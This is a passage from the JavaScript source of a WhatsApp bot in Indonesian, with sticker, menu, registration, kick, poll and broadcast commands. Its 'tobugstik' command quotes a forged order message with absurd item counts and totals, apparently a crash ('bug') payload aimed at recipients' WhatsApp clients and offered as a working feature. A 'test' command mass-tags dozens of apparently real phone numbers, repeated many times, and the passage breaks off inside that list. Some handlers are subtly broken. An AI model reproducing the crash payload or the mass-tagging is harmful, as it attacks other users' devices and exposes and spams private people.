			vtype = Object.keys(message.message.viewOnceMessage.message)[0]
			delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
			delete message.message.viewOnceMessage.message[vtype].viewOnce
			message.message = {
				...message.message.viewOnceMessage.message
			}
		}

        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
		let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await rimurubotz.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
        return waMessage
    }
    
		const resize = async (image, width, height) => {
       let oyy = await Jimp.read(image)
       let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
       return kiyomasa
      }
    /** Profile Image
      *
      * @param {Buffer} Buffer (Only Image)
      * @param {Numeric} Width
      * @param {Numeric} Height
      */
  const generateProfilePicture = async (buffer) => {
	const jimp = await Jimp.read(buffer)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
		preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
	}
}
  const updateProfilePicture = async (jid, buffer) => {
let { img, preview } = await generateProfilePicture(buffer) 
         await rimurubotz.query({
             tag: 'iq',
             attrs: {
                to: jid,
                type: 'set',
                xmlns: 'w:profile:picture'
             },
             content: [{
                 tag: 'picture',
                 attrs: {
                    type: 'image'
                 },
                    content: img
             }]
         })
         }
   const getBff = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}

// SetBot

// Menfess 
const mAdd = (dr, kpd) => {
        const obj = { dari: dr, kepada: kpd, status: true }
        menfess.push(obj)
        fs.writeFileSync('./lib/menfess.json', JSON.stringify(menfess, null, 2))
        }
        const dellFess = (dr, kpd) => {
        const obj = { dari: dr, kepada: kpd, status: false }
        menfess.push(obj)
        fs.writeFileSync('./lib/menfess.json', JSON.stringify(menfess, null, 2))
        }
        const checkMenfess = (to, menfess) => {
        let status = false
        Object.keys(menfess).forEach((i) => {
        if (menfess[i].kepada === to) {
            status = true
        }
        })
        return status
        }
const isTo = checkMenfess(sender, menfess)
        const checkF = (from, menfess) => {
        let status = false
        Object.keys(menfess).forEach((i) => {
        if (menfess[i].dari === from ) {
            status = true
        }
        })
        return status
        }
        const checkog = (to, menfess) => {
        let status = false
        Object.keys(menfess).forEach((i) => {
        if (menfess[i].status === true) {
            status = true
        }
        })
        return status
        }
        const isMenfess = checkog(sender, menfess)
        const isSend = checkF(sender, menfess)
        // Batass menfess

    
    
    
    
    
   const sendContact = async (kon, quoted = '', options = {}) => {
	let list = []
	for (let i of kon) {
	    list.push({
	    	displayName: `${footer}`,
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:$|\nFN:${footer}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:satganzdevs@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://bit.ly/SatganzDevs\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	rimurubotz.sendMessage(from, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...options }, { quoted })
    }
    const send5ButImg = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
        let message = await prepareWAMessageMedia({ image: img }, { upload: rimurubotz.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
        hydratedTemplate: {
        imageMessage: message.imageMessage,
               "hydratedContentText": text,
               "hydratedFooterText": footer,
               "hydratedButtons": but
            }
            }
            }), options)
            rimurubotz.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    function nullish(args) {
    return !(args !== null && args !== undefined)
}

 const sendPayment = async (jid, amount, currency, text = '', from, image, options) => {
    const requestPaymentMessage = { amount: {
            currencyCode: currency,
            offset: 0,
            value: amount
        },
        expiryTimestamp: 0,
        amount1000: amount,
        currencyCodeIso4217: currency,
        requestFrom: from,
        noteMessage: {
            extendedTextMessage: {
                text: text
            }
        },
        background: thumb
    }
    rimurubotz.relayMessage(jid, { requestPaymentMessage }, { ...options });
}
const sendDaftar = async (jid) => {
let cap = `${ucapin} - @${sender.split('@')[0]}\n\nKamu belum terdaftar di Database bot, Silahkan mendaftar terlebih dahulu, tekan tombol di bawah`
let regisMessage = {
image: thumb,
document: fs.readFileSync('./menu.doc'),
jpegThumbnail: thumb,
fileName: footer,
mimetype: 'application/pdf',
fileLength: '999999',
pageCount: '999',
caption : cap,
footer : `© XxX - Team`,
buttons: [{ buttonId: '.daftar', buttonText: { displayText: 'D A F T A R' }, type: 1 }],
mentions: [sender],
headerType: 2,
        }
rimurubotz.sendMessage(jid, regisMessage)
}
const sendKatalog = async (jid , title = '' , desc = '', gam , options = {}) =>{
let message = await prepareWAMessageMedia({ image: gam }, { upload: rimurubotz.waUploadToServer })
const toduh = generateWAMessageFromContent(jid,
{"productMessage": {
"product": {
"productImage": message.imageMessage,
"productId": "191919191",
"title": title,
"message": "haii",
"description": desc,
"currencyCode": "IDR",
"priceAmount1000": "1000000",
"url": `https://youtube.com/channel/UC7NslQroUqQYzo2wDFBOUMg`,
"retailerId": `91973872`,
"productImageCount": 1,
"salePriceAmount1000": "0"
},
"businessOwnerJid": `6281316701742@s.whatsapp.net`
}
}, options)
return rimurubotz.relayMessage (from, toduh.message, {messageId: toduh.key.id})
}
const del = async (mess) => {
await rimurubotz.sendMessage(from, { delete: { fromMe: false, remoteJid: from, id: mess, participant: sender } })
}


                
                
                
    
	
        //Auto Respon
        rimurubotz.readMessages([nay.key])
		rimurubotz.sendPresenceUpdate('composing', from)
	
                
                
                
        // Daftar sebelum menggunakan Bot
                
                
               
                
                
                
                
                
switch (command) { 
case 'vote':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroupAdmins) return reply('Lu bukan admin mek')
let sendPoll = async (jid, name = '', optiPoll, options) => {
                if (!Array.isArray(optiPoll[0]) && typeof optiPoll[0] === 'string') optiPoll = [optiPoll]
                if (!options) options = {}
                const pollMessage = {
        name: `*${name}*`,
        options: optiPoll.map(btn => ({
                            optionName: !nullish(btn[0]) && btn[0] || ''
                    })),
                    selectableOptionsCount: 1
        }
                return rimurubotz.relayMessage(jid, { pollCreationMessage: pollMessage }, { ...options });
                }
let a = []
let b = q.split('&')
for (var cebok = 1; cebok < b.length; cebok++) {
a.push([b[cebok]])
}
sendPoll(from, q1, a, nay)
break
case 'setppbot':
case 'setbotpp':
if (!isOwner) return reply('Luwh siapa?')
let medias = await downloadContentFromMessage(nay.message.imageMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of medias) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./botpp.jpg', buffer)
const image = fs.readFileSync('./botpp.jpg')
await updateProfilePicture(botNumber, image)
reply('success')
await fs.unlinkSync(medias)
break
case 'setppgc':
case 'setppgrup':
case 'setppgroup':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroupAdmins) return reply('only admins')
if (!isBotGroupAdmins) return reply('Bot Bukanlah Admin!')
if (!isGroup) return reply('Grup Only!')
let mediar = await downloadContentFromMessage(nay.message.imageMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffers = Buffer.from([])
for await(const chunk of mediar) {buffers = Buffer.concat([buffers, chunk])}
fs.writeFileSync('./ppgrup.jpg', buffers)
const iimage = fs.readFileSync('./ppgc.jpg')
await updateProfilePicture(from, iimage)
reply('success')
await fs.unlinkSync(medias)
break
case 'afk':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (cekUser("afk", sender) == true) return reply("Kamu Telah afk sebelumnya")
if (!q) return reply("Masukkan alasan Apa kamu afk")
reply(`[ *SUKSES AFK* ]\n• *User* : @${sender.split("@")[0]}\n• *Alasan* : ${q}\n\n~> [🤖] : Saya akan merespon jika ada yang mengTag @ anda, Saya juga menunggu anda kembali❤`)
setUser("±afk", sender, true)
setUser("±alasan", sender, q)
break
case 'menu':
if (cekUser("id", sender) == null) return sendDaftar(from)
let buttonMessage = {
image: thumb,
caption : `${ucapin} - @${sender.split('@')[0]}\n\n` +help(prefix, reply, cekUser, namabot, sender),
footer : `© XxX - Team`,
buttons: [{buttonId: '.owner', buttonText: { displayText: 'O W N E R' }, type: 1 }],
mentions: [sender],
headerType: 2,
contextInfo: { 
externalAdReply :{
mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`,
mediaType: 1,
description: 'Join Group Official', 
title: 'ＸｘＸ － Ｔｅａｍｓ Official',
body: footer,
thumbnail: thumb,
renderLargerThumbnail: 1,
sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`
     }}
        }
rimurubotz.sendMessage(from, buttonMessage, fakestatus)
break
case 's':
case 'sticker':
case 'stiker':
case 'sgif':
case 'stickergif':
case 'stikergif':
if (cekUser("id", sender) == null) return sendDaftar(from)
try {
if (isMedia || isQuotedImage) { 
var stream = await downloadContentFromMessage(nay.message.imageMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.jpg', buffer)
const image = './res_buffer.jpg'
await ffmpeg(image)
.input(image)
.on('error', function (error) { only("error", rimurubotz, from) })
.on('end', function () {rimurubotz.sendMessage(from, { sticker: {url: './mysticker.webp'}, mimetype: 'image/webp', contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}})})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./mysticker.webp')} else if (isMedia || isQuotedVideo) {only("proses", rimurubotz, from)
var stream = await downloadContentFromMessage(nay.message.videoMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.mp4', buffer)
const video = './res_buffer.mp4'
await ffmpeg(video)
.input(video)
.on('error', function (error) {reply("error")
console.log(`${error}`)})
.on('end', function () { rimurubotz.sendMessage(from, { sticker: {url: './mysticker2.webp' }, mimetype: 'image/webp', contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}})})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save('./mysticker2.webp')} else {
reply('_Kirim gambar/video dengan caption !sticker/ reply gambar/video dengan perintah !sticker_ ')
}} catch (e) {only("error", rimurubotz, from)}
break
case 'owner':
if (cekUser("id", sender) == null) return sendDaftar(from)
var num = ["6281316701742"]
var balsem = sendContact(num, nay)
await sleep(300)
let men = `${ucapin} - @${sender.split('@')[0]} \n\n that's my own, don't spam him`
rimurubotz.sendMessage(from, {text:men}, {quoted: nay, mentions: sender})
break
case 'donasi': 
sendMedia("image", donasi, "Donasi kak minimal 1k❤")
break
case 'daftar': case 'login':
user.push({ id: sender, emote: "❤", timers: moment().format('LLL'), hit: 0, star: 1, afk: false, alasan:false, ban: false, premium: false })
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))
rimurubotz.sendMessage(from, { document: fs.readFileSync('./menu.doc'),
jpegThumbnail: thumb,
fileName: footer,
mimetype: 'application/pdf',
fileLength: '999999',
pageCount: '999', thumb, caption: `${ucapin} - @${sender.split('@')[0]}\n\n
• *User* : ${sender.split("@")[0]}
• *Star* : ⭐[1]
• *Hit* : 0
• *Premium* : false
• *Ban* : false
• *Afk* : false
~> [🤖] : Selamat @${sender.split("@")[0]} Anda berhasil bergabung ke database bot pada ${moment().format('LLL')}`, contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}
        }, { quoted: nay })
break
break
case 'tobugstik':
if (cekUser("id", sender) == null) return sendDaftar(from)
const bugstik = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...({
				remoteJid: ""
			})
		},
		"message": {
			"orderMessage": {
				"orderId": "594071395007984",
				"thumbnail": thumb,
				"itemCount": 100000000000,
				"status": "INQUIRY",
				"surface": "CATALOG",
				"message": ucapin + pushname,
				"orderTitle": ucapin + pushname,
				"sellerJid": "62857887347569@s.whatsapp.net",
				"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
				"totalAmount1000": "500000000000000",
				"totalCurrencyCode": "IDR"
			}
		}
	}
try {
if (isMedia || isQuotedImage) { 
var stream = await downloadContentFromMessage(nay.message.imageMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.jpg', buffer)
const image = './res_buffer.jpg'
await ffmpeg(image)
.input(image)
.on('error', function (error) { only("error", rimurubotz, from) })
.on('end', function () {rimurubotz.sendMessage(from, { sticker: {url: './mysticker.webp'}, mimetype: 'image/webp', contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}}, { quoted: bugstik })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./mysticker.webp')} else if (isMedia || isQuotedVideo) {only("proses", rimurubotz, from)
var stream = await downloadContentFromMessage(nay.message.videoMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.mp4', buffer)
const video = './res_buffer.mp4'
await ffmpeg(video)
.input(video)
.on('error', function (error) {reply("error")
console.log(`${error}`)})
.on('end', function () { rimurubotz.sendMessage(from, { sticker: {url: './mysticker2.webp' }, mimetype: 'image/webp', contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}}, { quoted: bugstik })})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save('./mysticker2.webp')} else {
reply('_Kirim gambar/video dengan caption !sticker/ reply gambar/video dengan perintah !sticker_ ')
}} catch (e) {only("error", rimurubotz, from)}
break
case 'bc':
case 'broadcast':
case 'bcall':
if (!isOwner) return reply('Lu siapa anying')
var data = await store.chats.all()
 rpy(from, `mengirim broadcast ke ${data.length} Chats`)
for (let i of data) {
rimurubotz.sendMessage(i.id, { document: fs.readFileSync('./menu.doc'), jpegThumbnail: dthumb, fileName: footer, mimetype: 'application/pdf', fileLength: '999999', pageCount: '999', thumb, caption: `${q}`, contextInfo: { 
externalAdReply :{
mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`,
mediaType: 1,
description: 'Join Group Official', 
title: '*_BROADCAST_*',
body: footer,
thumbnail: thumb,
renderLargerThumbnail: 1,
sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`
     }}})
await sleep(1000)
}
rpy(from, `success broadcast ke ${data.length} Chats`)
break
case 'kick': case 'remove':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (Tag() == "") return reply("tag Orang yang mau anda kick")
rimurubotz.sendMessage(from, {text:`Byeee Byeee @${Tag()[0].split("@")[0]}`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
await rimurubotz.groupParticipantsUpdate(from, Tag(), "remove").catch(e => {only("error", rimurubotz, from)})
break
case 'kicktime': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q2 && !q3){ if (Tag() == "") return reply("Tag Orang yang mau anda kick")
return rimurubotz.sendMessage(from, {
text: `[ *KICK-TIMERS* ]\nSilahkan Pilih Time`,
buttonText: "OPEN",
sections:  [{title: "TIMERS", rows: [
{title: "10 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 10000 + "&10 Detik"},
{title: "20 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 20000 + "&20 Detik"},
{title: "30 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 30000 + "&30 Detik"},
{title: "1 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 60000 + "&1 Menit"},
{title: "5 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 300000 + "&2 Menit"},
{title: "10 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 600000 + "&10 Menit"},
{title: "15 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 900000 + "&15 Menit"},
{title: "30 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 1800000 + "&30 Menit"},
{title: "1 JAM", rowId: prefix + "kicktime " + Tag() + "&" + 3600000 + "&1 Jam"}
]}]
})}
if (q1 && q2 && q3) {
rimurubotz.sendMessage(from, {text:`[ *KICK-TIMERS* ]\nSukses mengatur jadwal, @${q1.split("@")[0]} akan terKick Dalam ${q3}`, mentions:[`${q1.split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
setTimeout( () => {
rimurubotz.groupParticipantsUpdate(from, [q1], "remove").catch(e => {only("error", rimurubotz, from)})
rimurubotz.sendMessage(from, {text:`[ *KICK-TIMERS* ]\nWaktu habis, Bye Byee!! @${q1.split("@")[0]}`, mentions:[`${q1.split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
}, q2)
}
break
case 'test':
sendKatalog(from, `
     🌺SATGANZ DEVS🌺
❌DUDUK SAMA RATA BERDIRI TANPA RAJA❌

🚭.💓.‼️.4️⃣0️⃣4️⃣.‼️.💓.🚭
https://chat.whatsapp.com/DTekvUn94ksGQKTBZU8KOd
@⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 